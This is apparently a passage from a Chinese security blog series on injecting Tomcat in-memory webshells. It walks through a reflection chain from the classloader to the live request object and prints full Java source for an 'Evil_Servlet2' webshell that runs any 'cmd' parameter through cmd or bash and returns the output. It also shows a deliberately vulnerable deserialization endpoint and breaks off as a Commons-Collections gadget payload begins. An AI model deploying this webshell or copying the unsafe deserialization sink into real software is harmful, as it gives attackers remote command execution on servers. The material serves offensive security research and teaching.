<p>最终产生的效果如下：<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1721790807087-7e213ed3-add1-4678-881f-0d5eff454a99.png#averageHue=%232d2f34&clientId=u0dc855d2-173f-4&from=paste&height=460&id=u142d1bb6&originHeight=863&originWidth=1961&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=554118&status=done&style=none&taskId=u90e1a600-4a35-463b-9d0b-27696271661&title=&width=1045.8666666666666'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1721790807087-7e213ed3-add1-4678-881f-0d5eff454a99.png#averageHue=%232d2f34&clientId=u0dc855d2-173f-4&from=paste&height=460&id=u142d1bb6&originHeight=863&originWidth=1961&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=554118&status=done&style=none&taskId=u90e1a600-4a35-463b-9d0b-27696271661&title=&width=1045.8666666666666" referrerpolicy="no-referrer" alt="image.png"><br>实际上到这我们又找到了一份新的用来存储 req 的地方，就是 ConnectionHandler 的 global 属性，所以可以转变一下思路，获取到这个 global 属性，进而获取到 request<br>又由于ConnectionHandler是 AbstractProtocol 的子类，我们可以先确定一手能否通过 AbstractProtocol 获取到 ConnectionHandler<br>跟进到AbstractProtocol 的构造方法，发现 ConnectionHandler 的构造实例化之后，然后调用 setHandler 方法将其 set 存入<code>this.handler</code>属性值，所以必然有 getHandler 方法获取到 handler<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1721791728937-d3e51db9-0895-4020-9134-b5b2efff18c9.png#averageHue=%232c2f36&clientId=u0dc855d2-173f-4&from=paste&height=238&id=uf41264ab&originHeight=446&originWidth=2112&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=295503&status=done&style=none&taskId=u1578d952-52a7-45cc-9fcf-74aee825626&title=&width=1126.4'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1721791728937-d3e51db9-0895-4020-9134-b5b2efff18c9.png#averageHue=%232c2f36&clientId=u0dc855d2-173f-4&from=paste&height=238&id=uf41264ab&originHeight=446&originWidth=2112&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=295503&status=done&style=none&taskId=u1578d952-52a7-45cc-9fcf-74aee825626&title=&width=1126.4" referrerpolicy="no-referrer" alt="image.png"><br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1721792205435-c48216d4-f7ae-4da1-aaa5-e3d2b0afd12b.png#averageHue=%23292a2c&clientId=u0dc855d2-173f-4&from=paste&height=176&id=u3a1aee9e&originHeight=330&originWidth=881&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=101197&status=done&style=none&taskId=u74f75fc8-d38e-4b89-a047-8cfdff32052&title=&width=469.8666666666667'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1721792205435-c48216d4-f7ae-4da1-aaa5-e3d2b0afd12b.png#averageHue=%23292a2c&clientId=u0dc855d2-173f-4&from=paste&height=176&id=u3a1aee9e&originHeight=330&originWidth=881&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=101197&status=done&style=none&taskId=u74f75fc8-d38e-4b89-a047-8cfdff32052&title=&width=469.8666666666667" referrerpolicy="no-referrer" alt="image.png"><br>所以现在思路后半段就可以通过反射调用<code>AbstractProtocol.getHandler</code>获取到 ConnectionHandler，再反射获取到 global<br>那么现在如何获取到AbstractProtocol？下面的思路就是从<br>首先是 AbstractProtocol 的继承关系<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1721806268459-e41fdd3d-e811-4117-9bda-a40091e1d2d4.png#averageHue=%234b564f&clientId=u0dc855d2-173f-4&from=paste&height=163&id=sNXJj&originHeight=306&originWidth=853&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=158552&status=done&style=none&taskId=u9181b060-1767-4fce-94cb-7a2fddffb64&title=&width=454.93333333333334'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1721806268459-e41fdd3d-e811-4117-9bda-a40091e1d2d4.png#averageHue=%234b564f&clientId=u0dc855d2-173f-4&from=paste&height=163&id=sNXJj&originHeight=306&originWidth=853&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=158552&status=done&style=none&taskId=u9181b060-1767-4fce-94cb-7a2fddffb64&title=&width=454.93333333333334" referrerpolicy="no-referrer" alt="image.png"><br>我们如果能够获取到其中一个具体继承的子类，那么就能够获取到 AbstractProtocol。后续的内容其实回顾一下 Tomcat 的架构比较好，但是这里就不讲了，我们直接讲思路。</p>
<h2 id="0x02-思路梳理和总结"><a href="#0x02-思路梳理和总结" class="headerlink" title="0x02 思路梳理和总结"></a>0x02 思路梳理和总结</h2><p>配合正常调用栈来讲<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1721814512258-bdac7df8-f951-46da-b439-8153780faa3a.png#averageHue=%2349544c&clientId=u0dc855d2-173f-4&from=paste&height=502&id=u7a8cab6c&originHeight=941&originWidth=937&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=534912&status=done&style=none&taskId=ub7663315-fd25-44e8-8d4d-d7db3ff1e48&title=&width=499.73333333333335'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1721814512258-bdac7df8-f951-46da-b439-8153780faa3a.png#averageHue=%2349544c&clientId=u0dc855d2-173f-4&from=paste&height=502&id=u7a8cab6c&originHeight=941&originWidth=937&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=534912&status=done&style=none&taskId=ub7663315-fd25-44e8-8d4d-d7db3ff1e48&title=&width=499.73333333333335" referrerpolicy="no-referrer" alt="image.png"><br>以蓝线为界，CoyoteAdapter 之后的逻辑就是 Tomcat 中 Container 的具体处理那一套了，包括 Valve 和责任链等等<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1721911313299-667f4e95-a9ee-4edc-9f94-ec213c309672.png#averageHue=%23c3de72&clientId=u6aa1d2ec-e63e-4&from=paste&height=182&id=uae4ad23b&originHeight=341&originWidth=1051&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=114237&status=done&style=none&taskId=u2a039074-d6f6-4078-b839-c60be490ef7&title=&width=560.5333333333333'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1721911313299-667f4e95-a9ee-4edc-9f94-ec213c309672.png#averageHue=%23c3de72&clientId=u6aa1d2ec-e63e-4&from=paste&height=182&id=uae4ad23b&originHeight=341&originWidth=1051&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=114237&status=done&style=none&taskId=u2a039074-d6f6-4078-b839-c60be490ef7&title=&width=560.5333333333333" referrerpolicy="no-referrer" alt="image.png"><br>CoyoteAdapter 作为 Tomcat 中 Connector 和 Container 的连接桥梁，本身肯定是会内置 Connector 的具体实现对象的，而 Connector 中的内容我们又可以划分为 ProtocolHandler 和 Adapter 两类，这里的 Adapter 就是CoyoteAdapter了。至于 ProtocolHandler，如果是正常的 Http&#x2F;1.1 的请求，内置的具体实现就是 Http11NioProtocol。<br>所以只要我们发送了一次 Http 请求，就能够通过 Connector 获取到 Http11NioProtocol。现在问题是如何获取到 Connctor？还是按照 Tomcat 的架构来，一个大的 server 具体是由每一个小的 service 去实现的，而一个 service 中又由 connector 和 container 组成。就可以考虑通过 service 去获取 connector。<br>实际上就是获取 StandardService 的 connectors 内置属性,具体的话就是 StandardSercvice 在 addconnector 的时候，最终将所有的 connector 都存进了 connectors 属性中（所以我们还要遍历它）<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1721816762222-10b21b90-0996-4921-b04c-31fa198bc310.png#averageHue=%23292b2d&clientId=ua8838585-efcc-4&from=paste&height=232&id=aiBdV&originHeight=435&originWidth=1560&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=264741&status=done&style=none&taskId=ubec400cf-2af8-4827-b70a-2b2497988f0&title=&width=832'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1721816762222-10b21b90-0996-4921-b04c-31fa198bc310.png#averageHue=%23292b2d&clientId=ua8838585-efcc-4&from=paste&height=232&id=aiBdV&originHeight=435&originWidth=1560&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=264741&status=done&style=none&taskId=ubec400cf-2af8-4827-b70a-2b2497988f0&title=&width=832" referrerpolicy="no-referrer" alt="image.png"><br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1721816837997-38b21e83-2d28-43fc-bc45-53feba2561bb.png#averageHue=%232a2c2e&clientId=ua8838585-efcc-4&from=paste&height=113&id=QTdBY&originHeight=212&originWidth=1001&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=86881&status=done&style=none&taskId=u6f982f33-b1e5-41e2-8dd4-19b39df8bb7&title=&width=533.8666666666667'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1721816837997-38b21e83-2d28-43fc-bc45-53feba2561bb.png#averageHue=%232a2c2e&clientId=ua8838585-efcc-4&from=paste&height=113&id=QTdBY&originHeight=212&originWidth=1001&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=86881&status=done&style=none&taskId=u6f982f33-b1e5-41e2-8dd4-19b39df8bb7&title=&width=533.8666666666667" referrerpolicy="no-referrer" alt="image.png"><br>到这是最后一个问题，如何获取到 StandardService？这里就涉及到 Tomcat 的一个加载问题。简单来说就是，Tomcat 中有多个 web 容器，但是有可能会出现一个 web 容器中加载了 CC 的 3.1 依赖，但是另一个容器加载了 CC 的 3.2 依赖，全类名相同的情况下就会出现加载问题，所以 Tomcat 中一般内置一种 ClassLoader，用来隔离 web 容器中的类加载工作–<code>WebappClassLoader</code>，<br>而 Thread 类中有 <code>getContextClassLoader()</code>以及 <code>setContextClassLoader()</code>方法 ，主要作用对象就是 WebappClassLoader（有些框架可能就不同，但实际上还是继承自 WebappClassLoaderBase 的其他 loader），所以我们能够通过 Thread.currentThread().getContextClassLoader()方法获取到 WebappClassLoader。<br>再观察一下 WebappClassLoaderBase 中的一些属性，我们能够通过其 getResources 方法获取到 StandardRoot<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1721870965962-58df1443-a9f6-44a2-a2dc-f4b4700c0b26.png#averageHue=%2326282a&clientId=ued30735e-21c6-4&from=paste&height=331&id=ud8c84310&originHeight=621&originWidth=1066&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=245372&status=done&style=none&taskId=u2ac0f684-a470-48a6-8587-f4cd2ea96ba&title=&width=568.5333333333333'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1721870965962-58df1443-a9f6-44a2-a2dc-f4b4700c0b26.png#averageHue=%2326282a&clientId=ued30735e-21c6-4&from=paste&height=331&id=ud8c84310&originHeight=621&originWidth=1066&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=245372&status=done&style=none&taskId=u2ac0f684-a470-48a6-8587-f4cd2ea96ba&title=&width=568.5333333333333" referrerpolicy="no-referrer" alt="image.png"><br>然后就能通过 standardRoot.getContext 获取到 standardContext(standardContext 的某些功能就是通过 standardRoot 实现的)，之后一类反射获取容器高一级管理：standardContext-&gt;ApplicationContext-&gt;standardService</p>
<p>总结一下整体思路：</p>
<ol>
<li>通过 WebappClassLoader-&gt;standardRoot-&gt;standardRoot-&gt;standardContext-&gt;ApplicationContext-&gt;standardService</li>
<li>通过 service 获取到大 Connector</li>
<li>再通过大 Connctor 获取到ProtocolHandler，具体的话就是Http11NioProtocol</li>
<li>又因为Http11NioProtocol 是AbstractProtocol 的子类，所以我们能够通过Http11NioProtocol 去获取到 AbstractProtocol</li>
<li>最后通过AbstractProtocol 获取到 内置的子类 ConnectionHandler，进而从它的属性值 global 中获取到 requestInfo 中封装的 request</li>
</ol>
<h2 id="0x03-代码实现"><a href="#0x03-代码实现" class="headerlink" title="0x03 代码实现"></a>0x03 代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.example.Servlets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.WebResourceRoot;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Connector;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardService;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.net.AbstractEndpoint;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/evil2&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil_Servlet2</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span>  &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//首先获取StandardService</span></span><br><span class="line">            <span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">            Field webappclassLoaderBaseField=Class.forName(<span class="string">&quot;org.apache.catalina.loader.WebappClassLoaderBase&quot;</span>).getDeclaredField(<span class="string">&quot;resources&quot;</span>);</span><br><span class="line">            webappclassLoaderBaseField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            WebResourceRoot resources=(WebResourceRoot) webappclassLoaderBaseField.get(webappClassLoaderBase);</span><br><span class="line">            <span class="type">Context</span> <span class="variable">Context</span> <span class="operator">=</span>  resources.getContext();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            ApplicationContext applicationContext=(ApplicationContext) context.get(Context);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">standardServiceField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>).getDeclaredField(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">            standardServiceField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            StandardService standardService=(StandardService) standardServiceField.get(applicationContext);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取Connctor</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">connectorsField</span> <span class="operator">=</span>Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardService&quot;</span>).getDeclaredField(<span class="string">&quot;connectors&quot;</span>);</span><br><span class="line">            connectorsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Connector[] connectors=(Connector[])connectorsField.get(standardService);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">//循环遍历Connectors</span></span><br><span class="line">            <span class="keyword">for</span>(Connector connector: connectors ) &#123;</span><br><span class="line">                <span class="comment">//当前去访问请求肯定是Http协议，所以我当前线程生成的connector内置的协议肯定是http</span></span><br><span class="line">                <span class="keyword">if</span> (connector.getScheme().contains(<span class="string">&quot;http&quot;</span>))&#123;</span><br><span class="line">                    <span class="comment">//从Connector中获取到AbstractProtocol对象，实际上现在这个实例是Http11NioProtocol,由于我们获取到的是整个Connectors，也就是说不同的协议存在不同的Connector完成功能的实现，我们这里肯定需要的是Http协议的Connector</span></span><br><span class="line">                    AbstractProtocol abstractProtocol=(AbstractProtocol) connector.getProtocolHandler();</span><br><span class="line">                    <span class="comment">//通过Http11NioProtocol（继承于AbstractProtocol）开始获取ConnectionHandler</span></span><br><span class="line">                    <span class="type">Method</span> <span class="variable">getHandler</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.AbstractProtocol&quot;</span>).getDeclaredMethod(<span class="string">&quot;getHandler&quot;</span>);</span><br><span class="line">                    getHandler.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    AbstractEndpoint.<span class="type">Handler</span> <span class="variable">connectionhandler</span> <span class="operator">=</span> (AbstractEndpoint.Handler) getHandler.invoke(abstractProtocol);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//开始获取connectionhandler中的global属性</span></span><br><span class="line">                    <span class="type">Field</span> <span class="variable">globalField</span> <span class="operator">=</span>Class.forName(<span class="string">&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;</span>).getDeclaredField(<span class="string">&quot;global&quot;</span>);</span><br><span class="line">                    globalField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    RequestGroupInfo global=(RequestGroupInfo) globalField.get(connectionhandler);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//global的作用就是用来缓存Processor的，因此它里面其实存储着很多Request请求的封装，具体的RequestInfo都是类似Http11Processor这种第二次封装进来的，我们还得判断出我们想要的那个RequestInfo</span></span><br><span class="line">                    Field processorField=Class.forName(<span class="string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                    processorField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    ArrayList processors=(ArrayList) processorField.get(global);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span> (Object processor: processors)&#123;</span><br><span class="line">                        <span class="type">RequestInfo</span> <span class="variable">requestInfo</span> <span class="operator">=</span>(RequestInfo) processor;</span><br><span class="line">                        <span class="comment">//这个判断条件就比较的灵活了，看各自当时去访问Memshell时路径的特点（就比如说我们注入了一个filter内存马，用cmd启动，那么就获取到当前请求的cmd参数时，判断为我们的内存马访问请求）</span></span><br><span class="line">                        <span class="keyword">if</span> (requestInfo.getCurrentQueryString().contains(<span class="string">&quot;cmd&quot;</span>))&#123;</span><br><span class="line">                                Field reqfield=Class.forName(<span class="string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">                                reqfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                                Request request=(Request) reqfield.get(requestInfo);</span><br><span class="line">                                org.apache.catalina.connector.Request currentreq=(org.apache.catalina.connector.Request) request.getNote(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                                <span class="comment">//已经有request了，直接获取到参数给他exec就完事了</span></span><br><span class="line">                                String cmd=currentreq.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                                <span class="keyword">if</span>(cmd!=<span class="literal">null</span>)&#123;</span><br><span class="line">                                    String cmds[]=<span class="literal">null</span>;</span><br><span class="line">                                    <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>))&#123;</span><br><span class="line">                                        cmds=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c&quot;</span>,cmd&#125;;</span><br><span class="line"></span><br><span class="line">                                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                                        cmds=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,cmd&#125;;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    <span class="comment">//将执行结果通过我们获取到的request返回出去</span></span><br><span class="line">                                    InputStream inputStream=Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                                    Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;//A&quot;</span>);</span><br><span class="line">                                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext()? scanner.next(): <span class="string">&quot;&quot;</span>;</span><br><span class="line">                                    PrintWriter writer=currentreq.getResponse().getWriter();</span><br><span class="line">                                    writer.write(output);</span><br><span class="line">                                    writer.flush();</span><br><span class="line">                                    writer.close();</span><br><span class="line"></span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>第一次去利用的时候发现，WebappclassLoader 的 getResources()方法，早在 8.5.78 的版本就被标价为了<code>@Deprecated</code>，直接就 return null 了，然后在 10.x 版本就直接移除了该方法，我不清楚服务器上的 Tomcat 源码如何，我个人用 idea 启动项目的话，也是直接 return null 的，所以导致构造失败。<br>如何解决这个问题呢？我这里采取的方法是利用反射将 Resources 取出来就好了，它本身 setResources 方法是没有被换掉的，所以还是会有赋值，其属性值还是会存在内存中。<br>所以在我看来，这个利用还是能够通杀很多版本的，不过就是需要这么点技巧，可能会在师傅们本地测试的卡一下。<br>然后是总结一下这个方法的思路：</p>
<ol>
<li>从 Tomcat 启动，到我们开始访问路由发送 http 请求开始，一整个调用栈的基础上进行的分析</li>
<li>首先是在<code>Http11Processor</code>的基础上，我们发现了第一次对于 request 和 reponse 参数的处理以及传递，所以开始定位寻找他们。</li>
<li>之后发现在<code>Http11Processor</code>的父类<code>AbstractProcessor</code>中发现了它两的定义。这样就好办了，即使我们找不到<code>AbstractProcessor</code>的定义，但是我们依然能够直接通过<code>Http11Processor</code>反射间接获取到 request 和 response</li>
<li>之后我们分析到在<code>AbstractProtocol#ConnectorHandler</code>中进行了 Processor 的注册 registry，也就是说只要我们之前发送过一次，或者在当此请求中发送过 http1&#x2F;1 请求,就会将<code>Http11Processor</code>注册进<code>ConnectorHandler</code>的属性值 global，所以获取到<code>ConnectorHandler</code>就能够获取到<code>Http11Processor</code>。获取到<code>ConnectorHandler</code>就需要获取到<code>AbstractProtocol</code></li>
<li>然后我们从 Tomcat 的整体架构入手，Connector 组件本身内置 ProtocolHandler 以及 Adopter，这里的 ProtocolHandler 就是<code>AbstractProtocol</code>了。所以我们又可以通过 StandService(Service 由 Connector 和 container 组成)的属性值<code>connectors</code>循环遍历到关于 Http11 的 connector，也就能够获取到我们想要的<code>AbstractProtocol</code>了。</li>
</ol>
<h1 id="反序列化打入内存马"><a href="#反序列化打入内存马" class="headerlink" title="反序列化打入内存马"></a>反序列化打入内存马</h1><h2 id="环境测试"><a href="#环境测试" class="headerlink" title="环境测试"></a>环境测试</h2><p>反序列化打入其实包括一切实战情况下，我们能够进行 Java 任意代码执行时，就能够尝试打入内存马，这里只是以最常见的反序列化执行 Java 代码作为学习。<br>并且思路其实也没那么难，甚至可以说我们只要将之前的东西进行一段段的拼接就行。<br>假设我们存在如下的反序列化攻击点：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/Vuln&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">vulnServlet</span>  <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes= Base64.getDecoder().decode(req.getParameter(<span class="string">&quot;data&quot;</span>));</span><br><span class="line">        ByteArrayInputStream BAIS=<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(BAIS);</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(objectInputStream.readObject());</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个时候我们就构造一份 CC3 作为 sink 点，以 HashMap 起手的链子 generate 出的序列化数据来打</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 